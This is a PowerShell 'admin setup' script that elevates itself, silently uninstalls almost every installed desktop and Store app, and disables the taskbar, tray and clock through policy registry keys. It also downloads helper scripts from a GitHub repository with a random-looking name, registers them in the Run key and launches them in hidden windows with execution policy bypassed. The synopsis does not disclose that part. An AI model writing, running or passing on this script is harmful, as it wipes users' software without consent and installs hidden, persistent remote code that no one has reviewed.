<#
.SYNOPSIS
  Clear removable apps, hide the taskbar, show folder / PowerShell / script badges.
#>
[CmdletBinding()]
param(
  [switch]$SkipWipe,
  [switch]$SkipTray,
  [switch]$ShowReport
)
Set-StrictMode -Version 1
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

function Test-IsAdmin {
  $id = [Security.Principal.WindowsIdentity]::GetCurrent()
  $p = New-Object Security.Principal.WindowsPrincipal($id)
  return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
function Get-Prop {
  param($Object, [string]$Name)
  if ($null -eq $Object) { return $null }
  $prop = $Object.PSObject.Properties[$Name]
  if ($prop) { return $prop.Value }
  return $null
}
function Get-SelfPath {
  foreach ($candidate in @($PSCommandPath, (Get-Prop $MyInvocation.MyCommand 'Path'), (Get-Prop $MyInvocation.MyCommand 'Definition'))) {
    if ($candidate -and $candidate -like '*.ps1' -and (Test-Path -LiteralPath $candidate)) { return $candidate }
  }
  return $null
}
function Test-NameLike([string]$Name, [string[]]$Patterns) {
  if ([string]::IsNullOrWhiteSpace($Name)) { return $false }
  foreach ($pattern in $Patterns) { if ($Name -like $pattern) { return $true } }
  return $false
}

$homeRoot = Join-Path $env:USERPROFILE 'admin'
New-Item -ItemType Directory -Force -Path $homeRoot | Out-Null
$log = Join-Path $homeRoot 'Clear-Apps-And-Tray.log'
$script:ReportKept = New-Object System.Collections.Generic.List[string]
$script:ReportCleared = New-Object System.Collections.Generic.List[string]
$script:ReportFailed = New-Object System.Collections.Generic.List[string]
$script:ReportFound = 0

function Write-Log([string]$Message) {
  $line = '{0:yyyy-MM-dd HH:mm:ss} {1}' -f (Get-Date), $Message
  try { $line | Tee-Object -FilePath $log -Append } catch { Write-Host $line }
}

Write-Host 'Clear-Apps-And-Tray 20260919k — report window'
Write-Log 'Clear-Apps-And-Tray 20260919k — report window'

if (-not (Test-IsAdmin)) {
  $self = Get-SelfPath
  if (-not $self) { $self = $MyInvocation.MyCommand.Definition }
  $arg = @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$self`"")
  if ($SkipWipe) { $arg += '-SkipWipe' }
  if ($SkipTray) { $arg += '-SkipTray' }
  if ($ShowReport) { $arg += '-ShowReport' }
  $style = if ($ShowReport) { 'Hidden' } else { 'Normal' }
  Start-Process -FilePath "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" -Verb RunAs -WindowStyle $style -ArgumentList $arg | Out-Null
  return
}

Write-Log "==== start user=$env:USERNAME computer=$env:COMPUTERNAME ===="

function Stop-OldHelpers {
  try { Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'AdminSetupStartLogo' -ErrorAction SilentlyContinue } catch {}
  Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue | ForEach-Object {
    if ($_.CommandLine -and ($_.CommandLine -like '*Show-StartLogo.ps1*' -or $_.CommandLine -like '*Show-FolderLogo.ps1*')) {
      try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {}
    }
  }
}
function Install-Helper([string]$Name) {
  $dest = Join-Path $homeRoot $Name
  $here = Split-Path -Parent (Get-SelfPath)
  $local = Join-Path $here $Name
  if ($local -and (Test-Path -LiteralPath $local)) { Copy-Item -LiteralPath $local -Destination $dest -Force }
  else {
    try { Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/$Name" -OutFile $dest } catch { Write-Log "$Name download failed: $($_.Exception.Message)" }
  }
  return $dest
}
function Start-HiddenScript([string]$Path, [string]$RunName) {
  if (-not (Test-Path -LiteralPath $Path)) { return }
  $runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
  New-Item -Path $runKey -Force | Out-Null
  $cmd = "`"$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe`" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$Path`""
  New-ItemProperty -Path $runKey -Name $RunName -Value $cmd -PropertyType String -Force | Out-Null
  Start-Process -FilePath "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$Path`"") | Out-Null
}
function Invoke-UninstallCommand([string]$Command) {
  if ([string]::IsNullOrWhiteSpace($Command)) { return $false }
  if ($Command -match '(?i)explorer(\.exe)?') { return $false }
  try {
    if ($Command -match '\{([0-9A-Fa-f-]{36})\}') {
      $p = Start-Process -FilePath 'msiexec.exe' -ArgumentList @("/X{$($Matches[1])}", '/qn', '/norestart') -Wait -PassThru -WindowStyle Hidden
      return ($p.ExitCode -in 0, 1605, 1614, 1641, 3010)
    }
    $exe = $Command; $args = ''
    if ($Command -match '^"([^"]+)"\s*(.*)$') { $exe = $Matches[1]; $args = [string]$Matches[2] }
    elseif ($Command -match '^(\S+)\s*(.*)$') { $exe = $Matches[1]; $args = [string]$Matches[2] }
    if ($exe -match '(?i)explorer(\.exe)?$') { return $false }
    if (-not (Test-Path -LiteralPath $exe)) { return $false }
    $low = "$args".ToLowerInvariant()
    if ($low -notmatch '/s\b|/silent|/quiet|/qn|/norestart') { $args = ("$args /S /silent /quiet /norestart").Trim() }
    $p = Start-Process -FilePath $exe -ArgumentList $args -Wait -PassThru -WindowStyle Hidden
    return ($null -eq $p.ExitCode -or $p.ExitCode -in 0, 1, 1605, 1614, 1641, 3010)
  } catch { return $false }
}

function Invoke-ClearWin32Apps {
  $protect = @('Microsoft Visual C++*','Microsoft Visual Studio* Redistributable*','Microsoft .NET*','Microsoft Edge*','Microsoft Edge WebView2*','Microsoft Update*','Windows PC Health Check*','Update for *','Security Update*','Hotfix*','Intel*','NVIDIA*','AMD*','Chipset*','Canon *','HP *','Printer*','Driver*','Windows Terminal*','Windows SDK*','Microsoft Windows*','Windows Malicious Software Removal*')
  $force = @('Realtek*')
  $paths = @('HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*')
  $removed = 0
  foreach ($prog in @(Get-ItemProperty $paths -ErrorAction SilentlyContinue)) {
    $name = [string](Get-Prop $prog 'DisplayName')
    if (-not $name) { continue }
    $script:ReportFound++
    $forced = Test-NameLike $name $force
    if (-not $forced) {
      $systemComponent = Get-Prop $prog 'SystemComponent'
      if ($null -ne $systemComponent) { try { if ([int]$systemComponent -eq 1) { [void]$script:ReportKept.Add("system  $name"); continue } } catch {} }
      if (Test-NameLike $name $protect) { [void]$script:ReportKept.Add("keep    $name"); continue }
    }
    $uninstall = [string](Get-Prop $prog 'QuietUninstallString')
    if (-not $uninstall) { $uninstall = [string](Get-Prop $prog 'UninstallString') }
    if (-not $uninstall) { [void]$script:ReportKept.Add("no-uninstaller  $name"); continue }
    Write-Host "Uninstall $name"
    Write-Log "Uninstall $name :: $uninstall"
    if (Invoke-UninstallCommand $uninstall) {
      $removed++
      [void]$script:ReportCleared.Add($name)
    } else {
      [void]$script:ReportFailed.Add($name)
    }
  }
  return $removed
}

function Invoke-ClearStoreApps {
  $keepAppx = @('Microsoft.WindowsStore','Microsoft.StorePurchaseApp','Microsoft.WindowsTerminal','MicrosoftWindows.Client*','Microsoft.Windows.*','Microsoft.UI.*','Microsoft.VCLibs*','Microsoft.Services.Store*','windows.immersivecontrolpanel','Microsoft.DesktopAppInstaller','Microsoft.SecHealthUI','Microsoft.MicrosoftEdge*','Microsoft.ECApp','Microsoft.LockApp','Microsoft.AAD.BrokerPlugin','Microsoft.AccountsControl','Microsoft.BioEnrollment','Microsoft.CredDialogHost','Microsoft.Win32WebViewHost','Microsoft.XboxGameCallableUI','Microsoft.PPIProjection')
  $removed = 0
  try {
    foreach ($pkg in @(Get-AppxPackage -AllUsers -ErrorAction SilentlyContinue)) {
      $name = [string]$pkg.Name
      if (-not $name) { continue }
      $script:ReportFound++
      if ($pkg.IsFramework -or $pkg.NonRemovable) { [void]$script:ReportKept.Add("store-system  $name"); continue }
      if (Test-NameLike $name $keepAppx) { [void]$script:ReportKept.Add("store-keep  $name"); continue }
      if ($name -like 'Microsoft.Windows.*' -or $name -like 'Windows.*') { [void]$script:ReportKept.Add("store-keep  $name"); continue }
      Write-Host "Remove Store app $name"
      try {
        Remove-AppxPackage -Package $pkg.PackageFullName -AllUsers -ErrorAction SilentlyContinue
        $removed++
        [void]$script:ReportCleared.Add("Store: $name")
      } catch {
        try {
          Remove-AppxPackage -Package $pkg.PackageFullName -ErrorAction SilentlyContinue
          $removed++
          [void]$script:ReportCleared.Add("Store: $name")
        } catch { [void]$script:ReportFailed.Add("Store: $name") }
      }
    }
  } catch {}
  return $removed
}

function Set-NoTaskbar {
  Write-Host 'Removing taskbar and placing folder logo...'
  Stop-OldHelpers
  $path = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer'
  New-Item -Path $path -Force | Out-Null
  foreach ($pair in @{ NoTrayItemsDisplay = 1; HideClock = 1; HideSCAHealth = 1; HideSCAMeetNow = 1; HideSCANetwork = 1; HideSCAVolume = 1; HideSCAPower = 1; NoAutoTrayNotify = 1; NoSetTaskbar = 1; NoTrayContextMenu = 1; HideLocaleBar = 1 }.GetEnumerator()) {
    try { New-ItemProperty -Path $path -Name $pair.Key -Value $pair.Value -PropertyType DWord -Force | Out-Null } catch {}
  }
  $adv = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced'
  New-Item -Path $adv -Force | Out-Null
  foreach ($pair in @{ ShowTaskViewButton = 0; TaskbarDa = 0; TaskbarMn = 0; ShowCopilotButton = 0; ShowTaskbarChat = 0; SearchboxTaskbarMode = 0; ShowCortanaButton = 0 }.GetEnumerator()) {
    try { New-ItemProperty -Path $adv -Name $pair.Key -Value $pair.Value -PropertyType DWord -Force | Out-Null } catch {}
  }
  Start-HiddenScript (Install-Helper 'Hide-Taskbar.ps1') 'AdminSetupHideTaskbar'
  Start-HiddenScript (Install-Helper 'Show-FolderLogo.ps1') 'AdminSetupFolderLogo'
}

function Show-WipeReport {
  Add-Type -AssemblyName System.Windows.Forms
  Add-Type -AssemblyName System.Drawing
  $lines = New-Object System.Collections.Generic.List[string]
  [void]$lines.Add("Clear-Apps-And-Tray  $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')")
  [void]$lines.Add("Computer  $env:COMPUTERNAME    User  $env:USERNAME")
  [void]$lines.Add('')
  [void]$lines.Add("Found     $($script:ReportFound)")
  [void]$lines.Add("Cleared   $($script:ReportCleared.Count)")
  [void]$lines.Add("Kept      $($script:ReportKept.Count)")
  [void]$lines.Add("Failed    $($script:ReportFailed.Count)")
  [void]$lines.Add('')
  [void]$lines.Add('--- Cleared ---')
  if ($script:ReportCleared.Count -eq 0) { [void]$lines.Add('(none)') }
  else { $script:ReportCleared | Sort-Object | ForEach-Object { [void]$lines.Add($_) } }
  [void]$lines.Add('')
  [void]$lines.Add('--- Failed ---')
  if ($script:ReportFailed.Count -eq 0) { [void]$lines.Add('(none)') }
  else { $script:ReportFailed | Sort-Object | ForEach-Object { [void]$lines.Add($_) } }
  [void]$lines.Add('')
  [void]$lines.Add('--- Kept ---')
  if ($script:ReportKept.Count -eq 0) { [void]$lines.Add('(none)') }
  else { $script:ReportKept | Sort-Object | ForEach-Object { [void]$lines.Add($_) } }
  [void]$lines.Add('')
  [void]$lines.Add("Log file: $log")
  $text = ($lines -join [Environment]::NewLine)
  try { $text | Set-Content -Path (Join-Path $homeRoot 'Clear-Apps-And-Tray-last.txt') -Encoding UTF8 } catch {}

  $win = New-Object System.Windows.Forms.Form
  $win.Text = 'Admin Setup — what ran'
  $win.Size = New-Object System.Drawing.Size(720, 560)
  $win.StartPosition = 'CenterScreen'
  $win.TopMost = $true
  $box = New-Object System.Windows.Forms.TextBox
  $box.Multiline = $true
  $box.ScrollBars = 'Both'
  $box.ReadOnly = $true
  $box.WordWrap = $false
  $box.Dock = 'Fill'
  $box.Font = New-Object System.Drawing.Font('Consolas', 10)
  $box.BackColor = [System.Drawing.Color]::FromArgb(24,24,24)
  $box.ForeColor = [System.Drawing.Color]::FromArgb(220,220,220)
  $box.Text = $text
  $win.Controls.Add($box)
  [void]$win.ShowDialog()
}

$win32 = 0; $store = 0
if ($SkipWipe) { Write-Log 'SkipWipe' } else {
  Write-Host 'Clearing installed apps (no prompts)...'
  $win32 = Invoke-ClearWin32Apps
  $store = Invoke-ClearStoreApps
}
if ($SkipTray) { Write-Log 'SkipTray' } else { Set-NoTaskbar }

Write-Log "Finished. Win32=$win32 Store=$store"
if ($ShowReport -or $true) { Show-WipeReport }
